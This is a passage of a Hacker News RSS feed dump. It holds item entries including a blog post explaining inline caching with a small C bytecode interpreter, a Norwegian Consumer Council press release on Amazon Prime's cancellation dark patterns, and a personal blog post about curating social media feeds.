https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-768x640.png 768w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png"></p></div></div></div></div></div><div data-id="caa5f78" data-element_type="column"><div><div><div data-id="76f0114" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Open source Developers on xs:code (Aces) are ranked using an algorithm that takes into account multiple factors, but gives significant weight to their contributions to open source repositories. Our matching algorithm provides the developers best equipped to help on any topic or open source repository.</p></div></div></div></div></div></div></div></section><section data-id="165d4b9" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div><div><div data-id="f109437" data-element_type="column"><div><div><div data-id="dd220c9" data-element_type="widget" data-widget_type="image.default"><div><p><img width="300" height="400" src="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/rocket-225x300.png 225w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20400'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/rocket-225x300.png 225w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png"></p></div></div><div data-id="8d70bd6" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Install the extension directly on VSCode or from the VSCode marketplace.</p></div></div></div></div></div></div></div></section><section data-id="b5b036b" data-element_type="section"><div><div><div data-id="e2ab2cd" data-element_type="column"><div><div><div data-id="a1c0f21" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Extend any developer-oriented product with xs:code Aces. Use the free xs:code SDK to add instant chat support to your App, platform or VSCode extension – and start earning additional revenue with our revenue-share partner program.</p></div></div></div></div></div><div data-id="382a9df" data-element_type="column"><div><div><div data-id="2530cce" data-element_type="widget" data-widget_type="image.default"><div><p><img width="1200" height="1000" src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-768x640.png 768w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201200%201000'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-768x640.png 768w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png"></p></div></div></div></div></div></div></div></section></div></div></div></div>]]>
            </description>
            <link>https://xscode.com/vscode-extension/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773743</guid>
            <pubDate>Thu, 14 Jan 2021 08:36:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Inline Caching]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25773724">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://bernsteinbear.com/blog/inline-caching/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/inline-caching/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Inline caching is a popular technique for runtime optimization. It was first
introduced in 1984 in Deutsch &amp; Schiffman’s paper <a href="http://web.cs.ucla.edu/~palsberg/course/cs232/papers/DeutschSchiffman-popl84.pdf">Efficient implementation
of the smalltalk-80 system [PDF]</a> but has had a long-lasting legacy in
today’s dynamic language implementations. Runtimes like the Hotspot JVM, V8,
and SpiderMonkey use it to improve the performance of code written for those
virtual machines.</p>

<p>In this blog post, I will attempt to distill the essence of inline caching
using a small and relatively useless bytecode interpreter built solely for this
blog post. The caching strategy in this demo is a technique similar to the
ideas from <a href="http://www.complang.tuwien.ac.at/kps09/pdfs/brunthaler.pdf">Inline Caching meets Quickening [PDF]</a> in that it
caches function pointers instead of making use of a JIT compiler.</p>

<h2 id="background">Background</h2>

<p>In many compiled programming languages like C and C++, types and attribute
locations are known at compile time. This makes code like the following fast:</p>

<div><div><pre><code><span>#include "foo.h"
</span>
<span>Foo</span> <span>do_add</span><span>(</span><span>Foo</span> <span>left</span><span>,</span> <span>Foo</span> <span>right</span><span>)</span> <span>{</span>
  <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>The compiler knows precisely what type <code>left</code> and <code>right</code> are (it’s <code>Foo</code>) and
also where the method <code>add</code> is in the executable. If the implementation is in
the header file, it may even be inlined and <code>do_add</code> may be optimized to a
single instruction. Check out the assembly from <code>objdump</code>:</p>

<div><div><pre><code>0000000000401160 &lt;_Z6do_add3FooS_&gt;:
  401160:	48 83 ec 18          	sub    $0x18,%rsp
  401164:	89 7c 24 0c          	mov    %edi,0xc(%rsp)
  401168:	48 8d 7c 24 0c       	lea    0xc(%rsp),%rdi
  40116d:	e8 0e 00 00 00       	callq  401180 &lt;_ZN3Foo3addES_&gt;
  401172:	48 83 c4 18          	add    $0x18,%rsp
  401176:	c3                   	retq   
</code></pre></div></div>

<p>All it does is save the parameters to the stack, call <code>Foo::add</code>, and then
restore the stack.</p>

<p>In more dynamic programming languages, it is often impossible to determine at
runtime startup what type any given variable binding has. We’ll use Python as an
example to illustrate how dynamism makes this tricky, but this constraint is
broadly applicable to Ruby, JavaScript, etc.</p>

<p>Consider the following Python snippet:</p>

<div><div><pre><code><span>def</span> <span>do_add</span><span>(</span><span>left</span><span>,</span> <span>right</span><span>):</span>
    <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>)</span>
</code></pre></div></div>

<p>Due to Python’s various dynamic features, the compiler cannot in general know
what type <code>value</code> is and therefore what code to run when reading <code>left.add</code>.
This program will be compiled down to a couple Python bytecode instructions
that do a very generic <code>LOAD_METHOD</code>/<code>CALL_METHOD</code> operation:</p>

<div><div><pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; dis.dis("""
... def do_add(left, right):
...     return left.add(right)
... """)
[snip]
Disassembly of &lt;code object do_add at 0x7f0b40cf49d0, file "&lt;dis&gt;", line 2&gt;:
  3           0 LOAD_FAST                0 (left)
              2 LOAD_METHOD              0 (add)
              4 LOAD_FAST                1 (right)
              6 CALL_METHOD              1
              8 RETURN_VALUE

&gt;&gt;&gt; 
</code></pre></div></div>

<p>This <code>LOAD_METHOD</code> Python bytecode instruction is unlike the x86 <code>mov</code>
instruction in that <code>LOAD_METHOD</code> is not given an offset into <code>left</code>, but
instead is given the name <code>"add"</code>. It has to go and figure out how to read
<code>add</code> from <code>left</code>’s type — which could change from call to call.</p>

<p>In fact, even if the parameters were typed (which is a new feature in Python
3), the same code would be generated. Writing <code>left: Foo</code> means that <code>left</code> is a
<code>Foo</code> <em>or</em> a subclass.</p>

<p>This is not a simple process like “fetch the attribute at the given offset
specified by the type”. The runtime has to find out what kind of object <code>add</code>
is. Maybe it’s just a function, or maybe it’s a <code>property</code>, or maybe it’s some
custom descriptor protocol thing. There’s no way to just turn this into a
<code>mov</code>!</p>

<p>… or is there?</p>

<h2 id="runtime-type-information">Runtime type information</h2>

<p>Though dynamic runtimes do not know ahead of time what types variables have at
any given opcode, they do eventually find out <em>when the code is run</em>. The first
time someone calls <code>do_add</code>, <code>LOAD_METHOD</code> will go and look up the type of
<code>left</code>. It will use it to look up the attribute <code>add</code> and then throw the type
information away. But the second time someone calls <code>do_add</code>, the same thing
will happen. Why don’t runtimes store this information about the type and the
method and save the lookup work?</p>

<p>The thinking is “well, <code>left</code> could be any type of object — best not make any
assumptions about it.” While this is <em>technically</em> true, Deutsch &amp;
Schiffman find that “at a given point in code, the receiver is often the same
class as the receiver at the same point when the code was last executed”.</p>

<blockquote>
  <p><strong>Note:</strong> By <em>receiver</em>, they mean the thing from which the attribute is
being loaded. This is some Object-Oriented Programming terminology.</p>
</blockquote>

<p>This is huge. This means that, even in this sea of dynamic behavior, humans
actually are not all that creative and tend to write functions that see only a
handful of types at a given location.</p>

<p>The Smalltalk-80 paper describes a runtime that takes advantage of this by
adding “inline caches” to functions. These inline caches keep track of variable
types seen at each point in the code, so that the runtime can make optimization
decisions with that information.</p>

<p>Let’s take a look at how this could work in practice.</p>

<h2 id="a-small-example">A small example</h2>

<p>I put together a <a href="https://github.com/tekknolagi/icdemo">small stack machine</a> with only a few operations. There
are very minimal features to avoid distracting from the main focus: inline
caching. Extending this example would be an excellent exercise.</p>

<h3 id="objects-and-types">Objects and types</h3>

<p>The design of this runtime involves two types of objects (<code>int</code>s and <code>str</code>s).
Objects are implemented as a tagged union, but for the purposes of this blog
post the representation does not matter very much.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kInt</span><span>,</span>
  <span>kStr</span><span>,</span>
<span>}</span> <span>ObjectType</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>ObjectType</span> <span>type</span><span>;</span>
  <span>union</span> <span>{</span>
    <span>const</span> <span>char</span> <span>*</span><span>str_value</span><span>;</span>
    <span>int</span> <span>int_value</span><span>;</span>
  <span>};</span>
<span>}</span> <span>Object</span><span>;</span>
</code></pre></div></div>

<p>These types have methods on them, such as <code>add</code> and <code>print</code>. Method names are
represented with an enum (<code>Symbol</code>) though strings would work just as well.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kAdd</span><span>,</span>
  <span>kPrint</span><span>,</span>

  <span>kUnknownSymbol</span> <span>=</span> <span>kPrint</span> <span>+</span> <span>1</span><span>,</span>
<span>}</span> <span>Symbol</span><span>;</span>
</code></pre></div></div>

<p>The representation of type information isn’t super important. Just know that
there is a function called <code>lookup_method</code> and that it is very slow. Eventually
we’ll want to cache its result.</p>

<div><div><pre><code><span>Method</span> <span>lookup_method</span><span>(</span><span>ObjectType</span> <span>type</span><span>,</span> <span>Symbol</span> <span>name</span><span>);</span>
</code></pre></div></div>

<p>Let’s see how we use these <code>lookup_method</code> in the interpreter.</p>

<h3 id="interpreter">Interpreter</h3>

<p>There’s no way to call these methods directly. For the purposes of this demo,
the only way to call these methods is through purpose-built opcodes. For
example, the opcode <code>ADD</code> takes two arguments. It looks up <code>kAdd</code> on the left
hand side and calls it. <code>PRINT</code> is similar.</p>

<p>There are only two other opcodes, <code>ARG</code> and <code>HALT</code>.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>// Load a value from the arguments array at index `arg'.</span>
  <span>ARG</span><span>,</span>
  <span>// Add stack[-2] + stack[-1].</span>
  <span>ADD</span><span>,</span>
  <span>// Pop the top of the stack and print it.</span>
  <span>PRINT</span><span>,</span>
  <span>// Halt the machine.</span>
  <span>HALT</span><span>,</span>
<span>}</span> <span>Opcode</span><span>;</span>
</code></pre></div></div>
<p>Bytecode is represented by a series of opcode/argument pairs, each taking up
one byte. Only <code>ARG</code> needs an argument; the other instructions ignore theirs.</p>

<p>Let’s look at a sample program.</p>

<div><div><pre><code><span>byte</span> <span>bytecode</span><span>[]</span> <span>=</span> <span>{</span><span>/*0:*/</span> <span>ARG</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*2:*/</span> <span>ARG</span><span>,</span>   <span>1</span><span>,</span>
                   <span>/*4:*/</span> <span>ADD</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*6:*/</span> <span>PRINT</span><span>,</span> <span>0</span><span>,</span>
                   <span>/*8:*/</span> <span>HALT</span><span>,</span>  <span>0</span><span>};</span>
</code></pre></div></div>

<p>This program takes its two arguments, adds them together, prints the result,
and then halts the interpreter.</p>

<p>You may wonder, “how is it that there is an instruction for loading arguments
but no call instruction?” Well, the interpreter does not support calls. There
is only a top-level function, <code>eval_code</code>. It takes an object, evaluates its
bytecode with the given arguments, and returns. Extending the interpreter to
support function calls would be another good exercise.</p>

<p>The interpreter implementation is a fairly straightforward <code>switch</code> statement.
Notice that it takes a representation of a function-like thing (<code>Code</code>) and an
array of arguments. <code>nargs</code> is only used for bounds checking.</p>

<div><div><pre><code><span>typedef</span> <span>unsigned</span> <span>char</span> <span>byte</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>ObjectType</span> <span>key</span><span>;</span>
  <span>Method</span> <span>value</span><span>;</span>
<span>}</span> <span>CachedValue</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>// Array of `num_opcodes' (op, arg) pairs (total size `num_opcodes' * 2).</span>
  <span>byte</span> <span>*</span><span>bytecode</span><span>;</span>
  <span>int</span> <span>num_opcodes</span><span>;</span>
  <span>// Array of `num_opcodes' elements.</span>
  <span>CachedValue</span> <span>*</span><span>caches</span><span>;</span>
<span>}</span> <span>Code</span><span>;</span>

<span>static</span> <span>unsigned</span> <span>kBytecodeSize</span> <span>=</span> <span>2</span><span>;</span>

<span>void</span> <span>eval_code_uncached</span><span>(</span><span>Code</span> <span>*</span><span>code</span><span>,</span> <span>Object</span> <span>*</span><span>args</span><span>,</span> <span>int</span> <span>nargs</span><span>)</span> <span>{</span>
  <span>int</span> <span>pc</span> <span>=</span> <span>0</span><span>;</span>
<span>#define STACK_SIZE 100
</span>  <span>Object</span> <span>stack_array</span><span>[</span><span>STACK_SIZE</span><span>];</span>
  <span>Object</span> <span>*</span><span>stack</span> <span>=</span> <span>stack_array</span><span>;</span>
<span>#define PUSH(x) *stack++ = (x)
#define POP() *--stack
</span>  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>Opcode</span> <span>op</span> <span>=</span> <span>code</span><span>-&gt;</span><span>bytecode</span><span>[</span><span>pc</span><span>];</span>
    <span>byte</span> <span>arg</span> <span>=</span> <span>code</span><span>-&gt;</span><span>bytecode</span><span>[</span><span>pc</span> <span>+</span> <span>1</span><span>];</span>
    <span>switch</span> <span>(</span><span>op</span><span>)</span> <span>{</span>
      <span>case</span> <span>ARG</span><span>:</span>
        <span>CHECK</span><span>(</span><span>arg</span> <span>&lt;</span> <span>nargs</span> <span>&amp;&amp;</span> <span>"out of bounds arg"</span><span>);</span>
        <span>PUSH</span><span>(</span><span>args</span><span>[</span><span>arg</span><span>]);</span>
        <span>break</span><span>;</span>
      <span>case</span> <span>ADD</span><span>:</span> <span>{</span>
        <span>Object</span> <span>right</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Object</span> <span>left</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Method</span> <span>method</span> <span>=</span> <span>lookup_method</span><span>(</span><span>left</span><span>.</span><span>type</span><span>,</span> <span>kAdd</span><span>);</span>
        <span>Object</span> <span>result</span> <span>=</span> <span>(</span><span>*</span><span>method</span><span>)(</span><span>left</span><span>,</span> <span>right</span><span>);</span>
        <span>PUSH</span><span>(</span><span>result</span><span>);</span>
        <span>break</span><span>;</span>
      <span>}</span>
      <span>case</span> <span>PRINT</span><span>:</span> <span>{</span>
        <span>Object</span> <span>obj</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Method</span> <span>method</span> <span>=</span> <span>lookup_method</span><span>(</span><span>obj</span><span>.</span><span>type</span><span>,</span> <span>kPrint</span><span>);</span>
        <span>(</span><span>*</span><span>method</span><span>)(</span><span>obj</span><span>);</span>
        <span>break</span><span>;</span>
      <span>}</span>
      <span>case</span> <span>HALT</span><span>:</span>
        <span>return</span><span>;</span>
      <span>default:</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"unknown opcode %d</span><span>\n</span><span>"</span><span>,</span> <span>op</span><span>);</span>
        <span>abort</span><span>();</span>
    <span>}</span>
    <span>pc</span> <span>+=</span> <span>kBytecodeSize</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Both <code>ADD</code> and <code>PRINT</code> make use of <code>lookup_method</code> to find out what function
pointer corresponds to the given <code>(type, symbol)</code> pair. Both opcodes throw away
the result. How sad. Let’s figure out how to save some of that data. Maybe we
can use the <code>caches</code> slot in <code>Code</code>.</p>

<h3 id="inline-caching-strategy">Inline caching strategy</h3>

<p>Since the Smalltalk-80 paper tells us that the receiver type is unlikely to
change from call to call at a given point in the bytecode, let’s cache <em>one</em>
method address per opcode. As with any cache, we’ll have to store both a key
(the object type) and a value (the method address).</p>

<p>There are several states that the cache could be in when entering the an
opcode:</p>

<ol>
  <li><strong>If it is empty</strong>, look up the method and store it in the cache using the
current type as a cache key. Use the cached value.</li>
  <li><strong>If it has an entry and the entry is for the current type</strong>, use the cached
value.</li>
  <li>Last, <strong>if it has an entry and the entry is for a different …</strong></li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bernsteinbear.com/blog/inline-caching/">https://bernsteinbear.com/blog/inline-caching/</a></em></p>]]>
            </description>
            <link>https://bernsteinbear.com/blog/inline-caching/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773724</guid>
            <pubDate>Thu, 14 Jan 2021 08:35:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon manipulates customers, Norwegian Consumer Council files legal complaint]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25773325">thread link</a>) | @matsemann
<br/>
January 13, 2021 | https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/ | <a href="https://web.archive.org/web/*/https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>
				14. januar, 2021			</span>
		</p><article>
							<p>Amazon puts obstacles in the way of consumers who wish to unsubscribe from its Amazon Prime service. Today the Norwegian Consumer Council filed a legal complaint against the company for breaches of the Unfair Commercial Practices Directive.</p><p>In the process of unsubscribing from Amazon Prime, the company manipulates consumers to continue using the service in what seems like a deliberate attempt to confuse and frustrate customers.</p>
<p>The Norwegian Consumer Council`s <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/complaint-against-amazon-prime.pdf">legal complaint</a>&nbsp;to the Consumer Protection Authority highlights what we believe to be Amazon´s unfair commercial practices and breaches of marketing law.</p>
<p>– It should be as easy to end a subscription as it was to subscribe in the first place. Amazon should facilitate a good user experience instead of hindering customers and tricking them into continuing paid services they do not need or want, said Director of Digital Policy at the Norwegian Consumer Council, Finn Lützow-Holm Myrstad.</p>
<p>– In our view, this practice not only betrays the expectations and trust of consumers but breaches European law.</p>
<h2><strong>One out of four consumers struggle to unsubscribe </strong></h2>
<p>The Norwegian Consumer Council <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/population-survey-digital-content.pdf">surveyed 1,000 Norwegian consumers</a> and analysed their experience. One out of four Norwegian consumers reported difficulties unsubscribing from digital content services. Twenty-five percent of consumers surveyed reported that they pay for one or more subscriptions that they use with such infrequency that they might as well end the subscription.</p>
<p>– Most of us use digital content services to watch movies, listen to music or audiobooks, play video games, or read the news. At the same time, many consumers experience issues with subscriptions being very easy to sign up for, but difficult to get out of, said Finn Myrstad.</p>
<p>– Companies such as Amazon seem to speculate that they can discourage customers from cancelling their subscriptions either by heavily emphasizing the benefits that will be lost upon cancellation or by making the process so complicated that its users simply give up.</p>
<h2><strong>Amazon manipulates users into staying by using dark patterns</strong></h2>
<p><iframe src="https://www.youtube-nocookie.com/embed/GpEQ4OWNO4Y" width="650" height="433" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">The Norwegian Consumer Council’s study</a> analysed the cancellation process for Amazon Prime. The analysis shows that consumers who want to leave the service are faced with a large number of hurdles, including complicated navigation menus, skewed wording, confusing choices, and repeated nudging. Throughout the process, Amazon manipulates users through wording and graphic design, making the process needlessly difficult and frustrating to understand.</p>
<p>– Unfortunately, using <em>dark patterns</em>, or manipulative design, is a common practice online. Consumers are constantly bombarded by a variety of subtle and less subtle attempts to push us into making choices that favour the companies at the cost of our own time, attention, and money, said Myrstad.</p>
<h2><strong>A global problem requires global solutions</strong></h2>
<p>16 different consumer organizations in Europe and the United States are now taking action against Amazon based on the report by the Norwegian Consumer Council. They will each ask their respective consumer authorities to investigate the use of dark patterns in their countries.</p>
<p>This international campaign builds upon the Norwegian Consumer Council’s joint 2018 campaign with seven other European consumer organizations against Google’s use of dark patterns. The complaint, which the Irish Data Protection Commissioner’s office is still investigating, uncovered how Google manipulates users into turning on comprehensive location tracking.</p>
<p>– The Consumer Protection Authority can set an important precedent by issuing a decision against Amazon. A decision in favour of the complaint would mark that the use of dark patterns is not in accordance with European law and would elevate the rights of consumers.</p>
<span><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">Report: You can log out but you can never leave</a></span>
							</article><div>
			<div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg" alt="Bilde av ansatt: Finn Myrstad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg"></p><p>Finn Myrstad</p><p>Fagdirektør digitale tjenester</p><p>(+47) 479 66 900</p><p>finn.myrstad@forbrukerradet.no</p></div><div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg" alt="Bilde av ansatt: Øyvind Herseth Kaldestad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg"></p><p>Øyvind H. Kaldestad</p><p>Pressekontakt / Kommunikasjonsrådgiver</p><p>(+47) 480 82 619 </p><p>ohk@forbrukerradet.no</p></div>			<div><h3 id="tittel">About Amazon Prime and Dark Patterns</h3>
			<hr><p><strong>Amazon Prime</strong></p>
<p>A subscription to Amazon Prime provides discounts, shipping benefits, and access to other Amazon services. The Amazon Prime service has more than 150 million subscribers worldwide. Amazon’s European headquarters is in Luxembourg.</p>
<p><strong>Dark patterns</strong></p>
<p>Dark patterns, or manipulative design, are features of user interface design that nudge or push consumers into making choices that are in the best interest of the service provider, rather than in the interest of the consumer. This may include that certain options are easier to choose than others, that consumers are tricked into giving consent to sharing personal data, and many other practices.</p>
<p><a href="https://www.forbrukerradet.no/dark-patterns/">Se more about The Consumer Council’s work on dark patterns and cunning design.</a></p>
</div>						<p>
				<span>
					<a href="https://www.forbrukerradet.no/nyhetsvarsling">Subscribe to news in English</a>
				</span>
			</p>
		</div></div>]]>
            </description>
            <link>https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773325</guid>
            <pubDate>Thu, 14 Jan 2021 07:35:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing the performance of Tensorflow training on M1 Mac Mini and Nvidia V100]]>
            </title>
            <description>
<![CDATA[
Score 224 | Comments 91 (<a href="https://news.ycombinator.com/item?id=25773109">thread link</a>) | @briggers
<br/>
January 13, 2021 | https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg | <a href="https://web.archive.org/web/*/https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773109</guid>
            <pubDate>Thu, 14 Jan 2021 07:04:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Average Joe – Simplifying the Stock Market for the Average Joe]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25773046">thread link</a>) | @theaveragejoe
<br/>
January 13, 2021 | https://readthejoe.com/subscribe/ | <a href="https://web.archive.org/web/*/https://readthejoe.com/subscribe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="start"><div id="content"> <div><div><div> <p><img src="https://readthejoe.com/wp-content/uploads/2020/08/Logo@3x-1.png"></p><h2>Join 6,000+ investors discovering new market opportunities</h2><p>Become a better investor with our free 2x-weekly newsletter.</p></div></div></div><div><div><p><img src="https://readthejoe.com/wp-content/uploads/2021/01/TAJ-Subscribe-Media-1-2.png"></p><div><h2>Market trends and opportunities</h2><p>Our team of analysts researches and analyzes emerging market opportunties to help you achieve better investment returns.</p></div></div><div><div><h2>Save 1,000+ hours on analysis and research</h2><p>We spend hundreds of hours each week analyzing the market to bring you the most important information.</p></div><p><img src="https://readthejoe.com/wp-content/uploads/2021/01/TAJ-Subscribe-Media-2.png"></p></div><div><p><img src="https://readthejoe.com/wp-content/uploads/2020/09/Homescreen-Tabs.jpg"></p><div><h2>Simple and brief financial news and trends</h2><p>We break down complicated financial topics and cover only the important news and trends to make you a better investor.</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://readthejoe.com/subscribe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773046</guid>
            <pubDate>Thu, 14 Jan 2021 06:55:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimize Your Distractions]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25772946">thread link</a>) | @akhilkg
<br/>
January 13, 2021 | https://www.akhilkg.me/blog/distractions | <a href="https://web.archive.org/web/*/https://www.akhilkg.me/blog/distractions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I’m not a “systems” person.</p>
<p>It’s not like I never tried - making schedules, using a Pomodoro timer,&lt;insert productivity “hack”&gt; - they didn’t work because I was trying to fit a square peg in a round hole.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104540572-bb4c3d00-5645-11eb-86f9-de27e6b8d07d.jpg" alt="square_peg.jpg"> <small> <a href="https://baddadcartoons101.wordpress.com/2017/09/04/square-peg-and-a-round-hole/" target="_blank" rel="noopener noreferrer"> <i> Source: BadDadCartoons </i> </a> </small> </p>
<p>What I ended up doing was instead of focusing on optimising the time I spent productively - i.e. the “deep work” part (which happened rather spontaneously independent of whether I’m on a productivity hack or not) - I decided to focus on the time that was not “deep work” i.e. time spent on ‘distractions’ or entertainment.</p>
<p>I used to spend an unhealthy amount of time in a day on Instagram where the feed was mostly filled with memes. I also used Quora/Twitter a lot.</p>
<p>Consuming content is easy. Like junk food. It's almost embedded in our reflexes.</p>
<p>But here’s the thing - you can easily turn your distractions to things that can benefit you.</p>
<p>How?</p>
<p>Start with cutting off distractions that have too much noise i.e. do not give you a good return of investment on your time in any of the following:</p>
<ul>
<li>Specific knowledge/skills</li>
<li>Specific insight</li>
<li>Accessing and leveraging a network</li>
</ul>
<p>For the ones that remain, optimise the shit out of them.</p>
<p>For me, that meant Instagram was instantly off the list. Twitter and Quora were okay, but I had a long way to go.</p>
<br>
<h3> Optimising your feed </h3>
<p>Social media “feed”.
What comes to your mind when you think of the word - “feed”?</p>
<p>This comes to my mind when I think “feed”</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104541024-c0f65280-5646-11eb-92f6-de5227d4b8a1.png" alt="sheep.jpg"> <i> <small> Sheep, “feed”ing </small>
</i> </p>
<p>Our minds are literally “fed” content.</p>
<p>“We are what we eat” - this doesn’t just stand for physical, tangible food - it applies to the digital content we feed our mind with.</p>
<p>I want you to take this literally because we take our attention for granted. In a digital economy run by monetising attention - it will naturally be full of noise.</p>
<p>Most of the content we read or watch is optimised solely for capturing our attention and clicks. More times than not, you don’t need something that is being shown to you. You will be perfectly fine without knowing it existed. Yep, sounds crazy but it is true.</p>
<p>I’m not trying to say social media is bad. Social media is an amplifier of all there is - of both the good stuff and the bad. It is an amplifier of your primal instincts so if you don’t proactively weed out the bad stuff from your feed regularly, you are going to get sick. Really sick.</p>
<p>What that means is, with some conscious effort you can filter out your feed to keep only the things that benefit you. Here’s how:</p>
